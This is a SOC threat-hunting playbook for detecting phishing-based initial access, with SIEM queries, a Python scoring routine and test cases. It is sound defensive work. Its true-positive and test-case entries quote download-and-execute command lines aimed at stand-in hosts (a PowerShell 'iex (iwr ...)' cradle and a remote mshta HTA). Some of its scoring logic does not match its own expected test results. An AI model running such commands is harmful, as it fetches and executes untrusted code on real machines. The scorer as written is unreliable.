# HUNT-010 — Initial Access Detection
<!-- T1566.001 · T1204.002 · T1059 -->

---

## Überblick

| Feld              | Inhalt                                                                                                    |
|-------------------|-----------------------------------------------------------------------------------------------------------|
| Hunt-ID           | HUNT-010                                                                                                  |
| MITRE ATT&CK      | T1566.001 (Spearphishing Attachment), T1204.002 (Malicious File), T1059 (Scripting)                     |
| Taktik            | Initial Access, Execution                                                                                 |
| Daten-Quellen     | Sysmon (1, 3, 11, 15), Windows Security (4688), Email Gateway logs, Proxy/Firewall                      |
| Konfidenz-Basis   | Parent-child process chains + file origin + working directory + network source + file extension          |
| Autor             | SOC Engineering                                                                                           |
| Letzte Revision   | 2026-06-03                                                                                                |

---

## Erkennungslogik / Detection Logic

### 1. Office Macro Execution — winword/excel Spawning Shells

**This is the canonical initial access indicator. Office applications should never spawn cmd.exe, powershell.exe, or scripting engines.**

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "ParentImage" AS office_app,
    "Image" AS child_proc,
    "CommandLine",
    "ParentCommandLine"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("ParentImage") IN (
        'c:\program files\microsoft office\root\office16\winword.exe',
        'c:\program files\microsoft office\root\office16\excel.exe',
        'c:\program files\microsoft office\root\office16\powerpnt.exe',
        'c:\program files\microsoft office\root\office16\outlook.exe',
        'c:\program files\microsoft office\root\office16\msaccess.exe',
        'c:\program files (x86)\microsoft office\root\office16\winword.exe',
        'c:\program files (x86)\microsoft office\root\office16\excel.exe',
        'c:\program files (x86)\microsoft office\root\office16\powerpnt.exe'
    )
    AND LOWER("Image") IN (
        'c:\windows\system32\cmd.exe',
        'c:\windows\system32\windowspowershell\v1.0\powershell.exe',
        'c:\windows\syswow64\windowspowershell\v1.0\powershell.exe',
        'c:\windows\system32\wscript.exe',
        'c:\windows\system32\cscript.exe',
        'c:\windows\system32\mshta.exe',
        'c:\windows\system32\certutil.exe',
        'c:\windows\system32\regsvr32.exe',
        'c:\windows\system32\rundll32.exe',
        'c:\windows\system32\bitsadmin.exe',
        'c:\windows\system32\curl.exe',
        'c:\windows\system32\net.exe',
        'c:\windows\system32\whoami.exe',
        'c:\windows\system32\ipconfig.exe'
    )
LAST 24 HOURS
ORDER BY event_time DESC
```

#### Splunk SPL
```spl
-- Office macro execution: parent-child process chain
index=sysmon EventCode=1
| eval parent_name=lower(replace(ParentImage, ".*\\\\([^\\\\]+)$", "\1"))
| eval child_name=lower(replace(Image, ".*\\\\([^\\\\]+)$", "\1"))
| eval is_office_parent=if(match(parent_name, "(winword|excel|powerpnt|outlook|msaccess|mspub)\.exe"), 1, 0)
| eval is_shell_child=if(match(child_name, "(cmd|powershell|wscript|cscript|mshta|certutil|regsvr32|rundll32|bitsadmin|curl|net|whoami|ipconfig|nslookup|nltest|tasklist|schtasks|sc|reg)\.exe"), 1, 0)
| where is_office_parent=1 AND is_shell_child=1
| eval macro_action=case(
    match(lower(CommandLine), "(-enc|-e |invoke-expression|iex|downloadstring|webclient)"), "POWERSHELL_DOWNLOAD",
    match(lower(CommandLine), "http"), "NETWORK_DOWNLOAD",
    match(child_name, "(whoami|ipconfig|nslookup|nltest|net\.exe)"), "RECON",
    match(child_name, "(wscript|cscript)"), "SCRIPT_EXEC",
    match(child_name, "mshta"), "HTA_EXEC",
    1==1, "SHELL_SPAWN"
  )
| eval confidence=case(
    macro_action="POWERSHELL_DOWNLOAD", 99,
    macro_action="NETWORK_DOWNLOAD", 98,
    macro_action="HTA_EXEC", 97,
    macro_action="SCRIPT_EXEC", 95,
    macro_action="RECON", 90,
    macro_action="SHELL_SPAWN", 92,
    1==1, 85
  )
| table _time, Computer, user, ParentImage, Image, CommandLine, macro_action, confidence
| sort -confidence
```

---

### 2. Browser Spawning Unusual Children

#### QRadar AQL
```aql
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "ParentImage" AS browser,
    "Image" AS spawned_proc,
    "CommandLine",
    "CurrentDirectory"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("ParentImage") IN (
        'c:\program files\google\chrome\application\chrome.exe',
        'c:\program files (x86)\google\chrome\application\chrome.exe',
        'c:\program files\mozilla firefox\firefox.exe',
        'c:\program files\microsoft\edge\application\msedge.exe',
        'c:\program files (x86)\internet explorer\iexplore.exe'
    )
    AND LOWER("Image") IN (
        'c:\windows\system32\cmd.exe',
        'c:\windows\system32\windowspowershell\v1.0\powershell.exe',
        'c:\windows\syswow64\windowspowershell\v1.0\powershell.exe',
        'c:\windows\system32\wscript.exe',
        'c:\windows\system32\mshta.exe',
        'c:\windows\system32\certutil.exe'
    )
    -- Exclude known browser update processes
    AND "CommandLine" NOT LIKE '%GoogleUpdate%'
    AND "CommandLine" NOT LIKE '%MicrosoftEdgeUpdate%'
    AND "CommandLine" NOT LIKE '%FirefoxSetup%'
LAST 24 HOURS
```

#### Splunk SPL
```spl
index=sysmon EventCode=1
| eval parent_name=lower(replace(ParentImage, ".*\\\\([^\\\\]+)$", "\1"))
| eval child_name=lower(replace(Image, ".*\\\\([^\\\\]+)$", "\1"))
| where match(parent_name, "(chrome|firefox|msedge|iexplore)\.exe")
| where match(child_name, "(cmd|powershell|wscript|cscript|mshta|certutil|regsvr32)\.exe")
| where NOT match(lower(CommandLine), "(googleupdate|microsoftedgeupdate|firefoxsetup|chromeupdate)")
| eval confidence=case(
    match(lower(CommandLine), "(-enc|-e |iex|invoke-expression|downloadstring)"), 98,
    match(lower(CommandLine), "http"), 93,
    child_name="mshta.exe", 95,
    1==1, 88
  )
| table _time, Computer, user, ParentImage, Image, CommandLine, CurrentDirectory, confidence
| sort -confidence
```

---

### 3. LNK File Execution from Downloads/Desktop/Temp

#### QRadar AQL
```aql
-- LNK execution: cmd/powershell spawned by explorer.exe from Downloads/Desktop/Temp working dir
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Image",
    "CommandLine",
    "CurrentDirectory",
    "ParentImage",
    "ParentCommandLine"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("ParentImage") IN (
        'c:\windows\explorer.exe',
        'c:\windows\syswow64\explorer.exe'
    )
    AND LOWER("Image") IN (
        'c:\windows\system32\cmd.exe',
        'c:\windows\system32\windowspowershell\v1.0\powershell.exe',
        'c:\windows\syswow64\windowspowershell\v1.0\powershell.exe',
        'c:\windows\system32\wscript.exe',
        'c:\windows\system32\mshta.exe',
        'c:\windows\system32\regsvr32.exe'
    )
    AND (
        LOWER("CurrentDirectory") LIKE '%\downloads\%'
        OR LOWER("CurrentDirectory") LIKE '%\desktop\%'
        OR LOWER("CurrentDirectory") LIKE '%\temp\%'
        OR LOWER("CurrentDirectory") LIKE '%\appdata\local\temp\%'
        OR LOWER("CurrentDirectory") LIKE '%\users\public\%'
    )
LAST 24 HOURS
ORDER BY event_time DESC
```

#### Splunk SPL
```spl
-- LNK/shortcut execution from suspicious locations
index=sysmon EventCode=1
| where lower(ParentImage) LIKE "%\\explorer.exe"
| where match(lower(Image), "(cmd\.exe|powershell\.exe|wscript\.exe|mshta\.exe|regsvr32\.exe)")
| where match(lower(CurrentDirectory), "(\\\\downloads\\\\|\\\\desktop\\\\|\\\\appdata\\\\local\\\\temp|\\\\users\\\\public\\\\|\\\\temp\\\\)")
| eval lnk_risk=case(
    match(lower(CommandLine), "(-enc|-e |iex|invoke-expression|downloadstring|webclient)"), "OBFUSCATED_PS",
    match(lower(CommandLine), "http"), "NETWORK_CMD",
    match(lower(CurrentDirectory), "\\\\downloads\\\\"), "FROM_DOWNLOADS",
    match(lower(CurrentDirectory), "(\\\\temp\\\\|\\\\public\\\\)"), "FROM_TEMP",
    1==1, "SHELL_FROM_EXPLORER"
  )
| eval confidence=case(
    lnk_risk="OBFUSCATED_PS", 97,
    lnk_risk="NETWORK_CMD", 93,
    lnk_risk IN ("FROM_DOWNLOADS","FROM_TEMP") AND match(lower(Image), "mshta\.exe"), 95,
    lnk_risk="FROM_DOWNLOADS", 85,
    lnk_risk="FROM_TEMP", 82,
    1==1, 75
  )
| table _time, Computer, user, Image, CommandLine, CurrentDirectory, lnk_risk, confidence
| sort -confidence
```

---

### 4. mshta.exe from Email Client / Browser (with Network Source)

#### Splunk SPL
```spl
-- mshta remote HTA from email or browser + correlation with network connection
index=sysmon EventCode=1 Image="*\\mshta.exe"
| where match(lower(ParentImage), "(outlook|winmail|thunderbird|chrome|firefox|msedge|iexplore)\.exe")
| join type=left ProcessGuid [
    search index=sysmon EventCode=3
    | where Image="*\\mshta.exe" AND NOT match(dest_ip, "^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)") 
    | stats min(_time) AS net_time, values(dest_ip) AS c2_ips, values(dest_port) AS ports BY ProcessGuid
  ]
| eval confidence=case(
    isnotnull(c2_ips) AND match(lower(ParentImage), "(outlook|winmail)\.exe"), 99,
    isnotnull(c2_ips), 95,
    match(lower(ParentImage), "(outlook|winmail)\.exe"), 92,
    1==1, 85
  )
| table _time, Computer, user, ParentImage, CommandLine, c2_ips, ports, confidence
| sort -confidence
```

---

### 5. ISO/IMG Mount + LNK Execution (MotW Bypass)

**Theory:** Files delivered via ISO/IMG bypass Mark-of-the-Web (MotW). Mounting an ISO presents a "virtual DVD" drive. Users click an LNK inside, which launches malware. Common delivery for Qakbot, Bumblebee, IcedID post-2022.**

#### QRadar AQL
```aql
-- ISO/IMG mount: new volume device + subsequent LNK execution from that volume
-- Step 1: Volume mount (Sysmon 12 - registry HKLM\SYSTEM\MountedDevices or process)
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    destinationip AS host,
    username,
    "Image",
    "CommandLine",
    "ParentImage",
    "CurrentDirectory"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Microsoft Sysmon', 'Sysmon')
    AND "Event ID" = '1'
    AND LOWER("ParentImage") IN (
        'c:\windows\explorer.exe'
    )
    AND (
        -- LNK execution from mounted drive letter (unusual letter beyond C/D)
        LOWER("Image") IN ('c:\windows\system32\cmd.exe', 'c:\windows\system32\windowspowershell\v1.0\powershell.exe')
        AND "CurrentDirectory" RLIKE '^[E-Z]:\\'
    )
LAST 24 HOURS

-- Alternative: regsvr32/rundll32/mshta from removable/virtual volume
SELECT *
FROM events
WHERE
    "Event ID" = '1'
    AND "CurrentDirectory" RLIKE '^[E-Z]:\\'
    AND LOWER("Image") IN (
        'c:\windows\system32\regsvr32.exe',
        'c:\windows\system32\mshta.exe',
        'c:\windows\system32\rundll32.exe'
    )
LAST 24 HOURS
```

#### Splunk SPL
```spl
-- ISO/MotW bypass: execution from non-standard drive letters (E-Z)
index=sysmon EventCode=1
| where match(CurrentDirectory, "^[E-Z]:\\\\")  -- mounted ISO/USB/virtual drive
| where match(lower(Image), "(cmd\.exe|powershell\.exe|wscript\.exe|mshta\.exe|regsvr32\.exe|rundll32\.exe)")
| eval drive_letter=substr(CurrentDirectory, 1, 1)
| eval motw_bypass=if(lower(ParentImage) LIKE "%explorer.exe", "LNK_FROM_MOUNTED", "DIRECT_EXEC")
| eval confidence=case(
    motw_bypass="LNK_FROM_MOUNTED" AND match(lower(Image), "(regsvr32|mshta|rundll32)"), 97,
    motw_bypass="LNK_FROM_MOUNTED" AND match(lower(CommandLine), "(-enc|http|iex)"), 95,
    motw_bypass="LNK_FROM_MOUNTED", 88,
    motw_bypass="DIRECT_EXEC" AND match(lower(Image), "(regsvr32|mshta)"), 90,
    1==1, 78
  )
| table _time, Computer, user, Image, CommandLine, CurrentDirectory, drive_letter, motw_bypass, confidence
| sort -confidence
```

---

### 6. Archive Execution from Temp — 7zip/WinRAR Spawning Executables

#### Splunk SPL
```spl
-- Archive tool spawning executables (extracted malware execution)
index=sysmon EventCode=1
| eval parent_name=lower(replace(ParentImage, ".*\\\\([^\\\\]+)$", "\1"))
| where match(parent_name, "(7z\.exe|7-zip\.exe|7zg\.exe|winrar\.exe|wrar\.exe|winzip\.exe|peazip\.exe|bandizip\.exe|unrar\.exe)")
| where NOT match(lower(Image), "(7z|winrar|winzip|setup|install|uninstall)\.exe")
| eval exec_from_archive=case(
    match(lower(CurrentDirectory), "(\\\\temp\\\\|\\\\appdata\\\\|\\\\downloads\\\\|\\\\users\\\\public\\\\)"), "FROM_TEMP",
    match(lower(Image), "(cmd|powershell|wscript|mshta|regsvr32)\.exe"), "SHELL_SPAWN",
    1==1, "BINARY_EXEC"
  )
| eval confidence=case(
    exec_from_archive="SHELL_SPAWN" AND match(lower(CommandLine), "(-enc|http|iex)"), 97,
    exec_from_archive="SHELL_SPAWN", 90,
    exec_from_archive="FROM_TEMP" AND match(lower(Image), "(cmd|powershell)\.exe"), 88,
    exec_from_archive="BINARY_EXEC" AND match(lower(CurrentDirectory), "(\\\\temp|\\\\downloads|\\\\public)"), 82,
    1==1, 70
  )
| where confidence >= 70
| table _time, Computer, user, ParentImage, Image, CommandLine, CurrentDirectory, exec_from_archive, confidence
| sort -confidence
```

---

### 7. HTML Smuggling — Blob/FileReader Indicators

**Theory:** HTML smuggling uses JavaScript Blob objects or FileReader API to reconstruct malicious files client-side, bypassing email gateway inspection. Files materialize in Downloads/Temp without traversing the network as executables.**

#### QRadar AQL (Proxy logs — HTML response analysis)
```aql
-- HTML smuggling: JS patterns in HTTP responses (proxy content inspection required)
SELECT
    DATEFORMAT(starttime, 'yyyy-MM-dd HH:mm:ss') AS event_time,
    sourceip AS client,
    "Request URL" AS url,
    "Response Size" AS resp_size,
    "Content Type"
FROM events
WHERE
    LOGSOURCETYPENAME(devicetype) IN ('Proxy', 'Bluecoat', 'Zscaler', 'Forcepoint')
    AND "Content Type" LIKE '%html%'
    AND "Response Size" > 100000   -- large HTML = embedded payload
    AND (
        CUSTOMSTRING("response_body") LIKE '%new Blob%'
        OR CUSTOMSTRING("response_body") LIKE '%URL.createObjectURL%'
        OR CUSTOMSTRING("response_body") LIKE '%click()%'
        OR CUSTOMSTRING("response_body") LIKE '%anchor.download%'
        OR CUSTOMSTRING("response_body") LIKE '%msSaveOrOpenBlob%'
    )
    AND "Request URL" NOT LIKE '%.microsoft.com%'
    AND "Request URL" NOT LIKE '%.sharepoint.com%'
LAST 24 HOURS
```

#### Splunk SPL (Sysmon — resulting file creation)
```spl
-- HTML smuggling result: ISO/ZIP/EXE appearing in Downloads without browser download event
index=sysmon EventCode=11
| where match(lower(TargetFilename), "\\\\downloads\\\\.*\.(iso|img|zip|rar|7z|js|hta|vbs|docm|xlsm|exe|dll)$")
| where lower(Image) NOT IN ("c:\\program files\\google\\chrome\\application\\chrome.exe",
    "c:\\program files\\mozilla firefox\\firefox.exe",
    "c:\\program files\\microsoft\\edge\\application\\msedge.exe")
-- File appeared in Downloads but NOT written by browser (HTML smuggling)
| eval smuggle_indicator=case(
    match(lower(TargetFilename), "\.(iso|img)$"), "ISO_SMUGGLED",
    match(lower(TargetFilename), "\.(hta|js|vbs)$"), "SCRIPT_SMUGGLED",
    match(lower(TargetFilename), "\.(exe|dll)$"), "BINARY_SMUGGLED",
    match(lower(TargetFilename), "\.(zip|rar|7z)$"), "ARCHIVE_SMUGGLED",
    1==1, "DOCUMENT_SMUGGLED"
  )
| eval confidence=case(
    smuggle_indicator="BINARY_SMUGGLED", 85,
    smuggle_indicator="ISO_SMUGGLED", 80,
    smuggle_indicator IN ("SCRIPT_SMUGGLED","HTA_SMUGGLED"), 88,
    smuggle_indicator="ARCHIVE_SMUGGLED", 72,
    1==1, 65
  )
| table _time, Computer, user, Image, TargetFilename, smuggle_indicator, confidence
| sort -confidence
```

---

### 8. Sysmon 15 — File Create + Stream (Alternate Data Streams / Zone.Identifier)

#### Splunk SPL
```spl
-- Sysmon 15: file with Zone.Identifier = 3 (downloaded from internet) then executed
index=sysmon EventCode=15
| eval file_ext=lower(replace(TargetFilename, ".*\\.([^.]+)$", "\1"))
| where match(file_ext, "^(exe|dll|js|vbs|hta|bat|ps1|cmd|iso|img|msi|lnk)$")
| where match(lower(Contents), "zoneid=3")   -- Zone 3 = Internet zone
| join type=left TargetFilename [
    search index=sysmon EventCode=1
    | eval exe_path=lower(Image)
    | stats min(_time) AS exec_time, values(CommandLine) AS exec_cmdlines BY exe_path
    | rename exe_path AS TargetFilename
  ]
| eval confidence=case(
    isnotnull(exec_time) AND match(file_ext, "^(exe|dll)$"), 95,
    isnotnull(exec_time) AND match(file_ext, "^(js|vbs|hta|ps1|bat)$"), 98,
    isnotnull(exec_time), 90,
    match(file_ext, "^(hta|js|vbs|ps1)$"), 75,
    1==1, 60
  )
| table _time, Computer, user, TargetFilename, file_ext, exec_time, exec_cmdlines, confidence
| sort -confidence
```

---

## True Positives (Echte Angriffsindikatoren)

### TP-001 — Emotet Macro → PowerShell Cradle
- **Indikatoren:** `WINWORD.EXE` → `cmd.exe /c powershell.exe -nop -w hidden -e <base64>`; Sysmon 3: `powershell.exe` outbound to 5 C2 IPs over 80/443; file dropped in `%AppData%`; WD detection suppressed via AMSI bypass
- **Confidence:** 99
- **MITRE:** T1566.001, T1059.001

### TP-002 — Qakbot via ISO + LNK
- **Indikatoren:** Email attachment `Invoice_2024.iso` mounted by user; `explorer.exe` working dir = `E:\`; LNK file triggers `regsvr32.exe E:\payload.dll`; Sysmon 3: `regsvr32.exe` C2 connection; Sysmon 11: DLL dropped to `%AppData%`
- **Confidence:** 98
- **MITRE:** T1204.002, T1218.010

### TP-003 — BazarLoader via HTML Smuggling
- **Indikatoren:** Proxy: large HTML response (>800KB) from `update-cdn.xyz` with Blob/createObjectURL; Sysmon 15: `loader.exe` created in Downloads with ZoneID=3 by `chrome.exe`; Sysmon 1: `chrome.exe` not writing the file — `WmiPrvSE.exe` parent (HTML JS execution); subsequent execution of `loader.exe`
- **Confidence:** 95
- **MITRE:** T1027.006

### TP-004 — Phishing LNK from 7zip
- **Indikatoren:** `winrar.exe` extracts `Resume_2024.lnk` to `%Temp%`; `explorer.exe` executes LNK; working dir = `C:\Users\victim\AppData\Local\Temp\`; LNK targets `powershell.exe -w hidden -c iex (iwr http://185.x.x.x/stage1.ps1)`
- **Confidence:** 97
- **MITRE:** T1204.002, T1566.001

### TP-005 — Outlook Spawning mshta (Remote HTA)
- **Indikatoren:** `OUTLOOK.EXE` → `mshta.exe http://attacker.xyz/stage.hta`; HTA uses `XMLHttpRequest` to download stage2; Sysmon 3: `mshta.exe` connection to external IP; Sysmon 11: `stage2.exe` created in `%Temp%`
- **Confidence:** 99
- **MITRE:** T1566.001, T1218.005

---

## False Positives (Bekannte FP-Quellen)

| FP-ID  | Quelle                        | Erkennungsmerkmal                                                         | Whitelist-Logik                                                                      |
|--------|-------------------------------|---------------------------------------------------------------------------|--------------------------------------------------------------------------------------|
| FP-001 | Office Hyperlink Click        | Word/Excel spawning browser (not shell) for URL in document               | Child process is browser EXE, not cmd/PowerShell; no script execution               |
| FP-002 | Office Plugin/Add-in          | Legitimate COM add-ins spawning helper processes                          | Child process is signed, path in `%ProgramFiles%`, no suspicious commandline        |
| FP-003 | PDF + Adobe Script            | Acrobat Reader spawning browser for PDF links                             | Parent is `AcroRd32.exe`/`Acrobat.exe` + child is browser (not shell)              |
| FP-004 | Browser Download + Run        | User downloads and runs installer from browser (Chrome parent)            | Chrome parent → signed installer in Downloads; not shell/scripting engine           |
| FP-005 | IT Software Package           | Packaged software delivered via compressed archive + auto-extract script  | Source is internal file share; signed installer; approved software list match       |
| FP-006 | OneDrive Sync                 | OneDrive placing files in Downloads (sync)                                | `OneDrive.exe` as creator; ZoneID=0 or 1 (not internet zone)                       |
| FP-007 | Developer Tools               | VS Code, Node.js, npm spawning cmd.exe for build processes                | Parent in approved dev tool list + working dir in user's dev project folder         |

---

## Varianten / Evasion-Techniken

### VAR-001 — Excel 4.0 Macro (XLM, not VBA)
- Uses legacy Excel 4 macro format (`.xlsm` or `.xls`) — less commonly detected
- **Detection:** Same parent-child: `excel.exe` spawning shell; `EXEC()` or `RUN()` XLM functions in 4103 scriptblock (if logging enabled)

### VAR-002 — OneNote Embedded Attachment (2023+)
- `ONENOTE.EXE` as parent (T1218 via OneNote); embedded `.hta` or `.exe` attachment double-clicked
- **Detection:** Sysmon 1: `ONENOTE.EXE` → `cmd.exe` / `wscript.exe` / `mshta.exe`; same parent-child logic

### VAR-003 — SVG Smuggling (HTML Smuggling via SVG)
- Inline SVG with embedded JavaScript; triggers on image view in browser or email client
- **Detection:** Same as HTML smuggling; SVG MIME type with JavaScript content; Blob pattern in SVG

### VAR-004 — LNK with Double Extension (PDF Spoofing)
- `Invoice_2024.pdf.lnk` rendered as PDF icon; user sees PDF, executes LNK
- **Detection:** Sysmon 11: `.lnk` file in Downloads; Sysmon 1: explorer.exe parent, shell child from Downloads path

### VAR-005 — CHM File Execution (T1218.001)
- Compiled HTML Help file with embedded HTA; `hh.exe` spawns `mshta.exe`
- **Detection:** Sysmon 1: `hh.exe` parent → `mshta.exe` or script engine child; `hh.exe` with `http://` in commandline

### VAR-006 — Callback via DNS (DNS Canary) + Delayed Payload
- Initial access payload does only DNS lookup; payload delivered later via scheduled task or startup
- **Detection:** Unusual DNS queries immediately after Office macro execution; subsequent persistence (HUNT-004)

### VAR-007 — MSDT (Follina) / Diagnostic Tool Exploit
- Word document triggers `msdt.exe` (Microsoft Support Diagnostic Tool) via ms-msdt URI; executes arbitrary code
- **Detection:** Sysmon 1: `winword.exe` → `msdt.exe`; or `msdt.exe` with `/id PCWDiagnostic /skip force` + payload in commandline

---

## Confidence Scoring

```python
from dataclasses import dataclass, field
from typing import List, Optional
import re

OFFICE_APPS = {
    "winword.exe", "excel.exe", "powerpnt.exe",
    "outlook.exe", "msaccess.exe", "mspub.exe", "onenote.exe"
}

BROWSERS = {"chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", "opera.exe"}

ARCHIVE_TOOLS = {
    "7z.exe", "7-zip.exe", "7zg.exe", "winrar.exe", "wrar.exe",
    "winzip.exe", "peazip.exe", "bandizip.exe", "unrar.exe"
}

SHELL_BINARIES = {
    "cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe",
    "mshta.exe", "certutil.exe", "regsvr32.exe", "rundll32.exe",
    "bitsadmin.exe", "curl.exe", "net.exe"
}

RECON_BINARIES = {"whoami.exe", "ipconfig.exe", "nslookup.exe", "nltest.exe",
                   "tasklist.exe", "systeminfo.exe", "net.exe", "hostname.exe"}

SUSPICIOUS_DIRS = re.compile(
    r"(?i)(\\downloads\\|\\appdata\\local\\temp\\?$|\\appdata\\roaming\\|\\users\\public\\|\\temp\\|\\programdata\\(?!microsoft|windows))",
    re.IGNORECASE
)

OBFUSCATED_PATTERNS = re.compile(
    r"(?i)(-enc\s|-e\s+[a-z0-9+/=]{20,}|invoke-expression|iex\s*\(|downloadstring|webclient|frombase64string)",
    re.IGNORECASE
)

@dataclass
class InitialAccessEvent:
    host: str
    username: str
    image: str
    parent_image: str
    commandline: str
    current_directory: str
    integrity_level: str = ""
    # Context flags
    has_network_connection: bool = False
    dest_ip: str = ""
    dest_url: str = ""
    zone_id: int = 0      # from Sysmon 15 / ZoneIdentifier
    is_signed_binary: bool = False
    is_from_email: bool = False  # file created by email client
    is_from_browser_download: bool = False
    is_approved_software: bool = False

def _bin_name(path: str) -> str:
    return path.lower().split("\\")[-1] if path else ""

def score_initial_access(evt: InitialAccessEvent) -> dict:
    if evt.is_approved_software:
        return {"confidence": 5, "verdict": "WHITELISTED", "reasons": ["Approved software"], "techniques": []}

    score = 0
    reasons = []
    techniques = []

    parent = _bin_name(evt.parent_image)
    child = _bin_name(evt.image)

    # --- Office macro execution ---
    if parent in OFFICE_APPS and child in SHELL_BINARIES:
        score += 70
        reasons.append(f"Office application spawning shell: {parent} → {child}")
        techniques.append("T1566.001")
        techniques.append("T1059")
        if OBFUSCATED_PATTERNS.search(evt.commandline):
            score += 20
            reasons.append("Obfuscated PowerShell command")
        if evt.has_network_connection:
            score += 10
            reasons.append(f"Network connection from shell: {evt.dest_ip}")

    # --- Browser spawning shells ---
    elif parent in BROWSERS and child in (SHELL_BINARIES | {"mshta.exe"}):
        if re.search(r"(googleupdate|microsoftedgeupdate|firefoxsetup)", evt.commandline, re.IGNORECASE):
            score += 5
            reasons.append("Browser update process — likely FP")
        else:
            score += 60
            reasons.append(f"Browser spawning shell: {parent} → {child}")
            techniques.append("T1204.002")

    # --- Archive tool spawning executables ---
    elif parent in ARCHIVE_TOOLS:
        if child in SHELL_BINARIES:
            score += 55
            reasons.append(f"Archive tool spawning shell: {parent} → {child}")
            techniques.append("T1204.002")
        elif SUSPICIOUS_DIRS.search(evt.current_directory):
            score += 40
            reasons.append(f"Binary executed from extracted archive in suspicious dir: {evt.current_directory}")
            techniques.append("T1204.002")

    # --- LNK from explorer in suspicious directory ---
    elif parent == "explorer.exe" and child in SHELL_BINARIES:
        if SUSPICIOUS_DIRS.search(evt.current_directory):
            score += 50
            reasons.append(f"Shell spawned by explorer from suspicious dir (LNK): {evt.current_directory}")
            techniques.append("T1204.002")
            if re.match(r"^[E-Z]:\\", evt.current_directory):
                score += 25
                reasons.append("Execution from non-standard drive (mounted ISO/USB - MotW bypass)")
                techniques.append("T1553.005")

    # --- Internet zone file ---
    if evt.zone_id == 3:
        score += 15
        reasons.append("File has ZoneID=3 (downloaded from Internet)")

    # --- Email-originated file ---
    if evt.is_from_email:
        score += 20
        reasons.append("File created by email client (spearphishing attachment)")
        techniques.append("T1566.001")

    # --- Obfuscated commandline boost ---
    if OBFUSCATED_PATTERNS.search(evt.commandline) and score > 0:
        score += 15
        reasons.append("Obfuscated/encoded commandline")

    # --- Network connection boost ---
    if evt.has_network_connection and score > 0:
        score += 10
        if evt.dest_ip and re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", evt.dest_ip):
            score += 10
            reasons.append(f"Raw IP C2 connection: {evt.dest_ip}")

    # --- Recon commands ---
    if child in RECON_BINARIES and parent in (OFFICE_APPS | BROWSERS):
        score += 15
        reasons.append(f"Recon command from {parent}: {child}")

    confidence = min(100, score)
    verdict = (
        "HIGH" if confidence >= 80
        else "MEDIUM" if confidence >= 55
        else "LOW" if confidence >= 30
        else "INFORMATIONAL"
    )

    return {
        "confidence": confidence,
        "verdict": verdict,
        "reasons": reasons,
        "techniques": list(set(techniques))
    }
```

---

## Testfälle / Test Cases

| TC-ID  | Typ           | Beschreibung                                                                                    | Expected Confidence | Expected Verdict |
|--------|---------------|-------------------------------------------------------------------------------------------------|---------------------|------------------|
| TC-001 | True Positive | WINWORD.EXE → cmd.exe /c powershell.exe -e <b64> (macro with encoded payload)                 | 95–100              | HIGH             |
| TC-002 | True Positive | OUTLOOK.EXE → mshta.exe http://attacker.xyz/stage.hta + Sysmon 3 network connection           | 95–100              | HIGH             |
| TC-003 | True Positive | explorer.exe → powershell.exe from C:\Users\victim\Downloads\ (LNK execution)                 | 82–95               | HIGH             |
| TC-004 | True Positive | regsvr32.exe from drive E:\ (mounted ISO), current_dir=E:\, parent=explorer.exe               | 90–100              | HIGH             |
| TC-005 | True Positive | winrar.exe → powershell.exe from C:\Temp\ with -enc argument                                  | 88–98               | HIGH             |
| TC-006 | True Positive | HTML smuggling: ISO in Downloads, ZoneID=3, written by non-browser process                    | 75–88               | HIGH             |
| TC-007 | True Positive | chrome.exe → cmd.exe (NOT update-related), no GoogleUpdate in cmdline                         | 75–90               | HIGH             |
| TC-008 | False Positive | WINWORD.EXE → chrome.exe (Word opens URL in browser via hyperlink)                            | ≤20                 | INFORMATIONAL    |
| TC-009 | False Positive | chrome.exe → setup.exe (Google Chrome update — GoogleUpdate in cmdline)                       | ≤15                 | INFORMATIONAL    |
| TC-010 | Edge Case     | 7z.exe → legitimate installer in Downloads (signed, approved software, ZoneID=3)              | 35–55               | LOW/MEDIUM       |
